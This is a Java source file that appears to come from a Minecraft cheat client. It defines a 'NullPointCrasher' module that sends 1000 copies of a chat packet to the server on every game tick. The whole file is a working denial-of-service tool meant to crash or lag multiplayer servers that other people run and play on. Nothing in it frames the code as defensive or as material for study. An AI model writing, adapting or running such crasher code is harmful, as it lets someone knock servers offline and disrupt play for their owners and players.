package net.sssssssthedev.SmartClient.module.crasher;

import net.minecraft.network.play.client.C01PacketChatMessage;
import net.sssssssthedev.SmartClient.annotations.modules.IModule;
import net.sssssssthedev.SmartClient.module.Category;
import net.sssssssthedev.SmartClient.annotations.modules.Module;
import net.sssssssthedev.SmartClient.utils.RandomUtils;

@IModule(
        name = "NullPointCrasher",
        key = 0,
        category = Category.CRASHER
)
public class NullPointCrasher extends Module {

    public void onUpdate() {
        C01PacketChatMessage packet = new C01PacketChatMessage(RandomUtils.randomNumber(100));
        for (int i = 0; i < 1000; i++)
            this.mc.thePlayer.sendQueue.addToSendQueue(packet);
    }
}
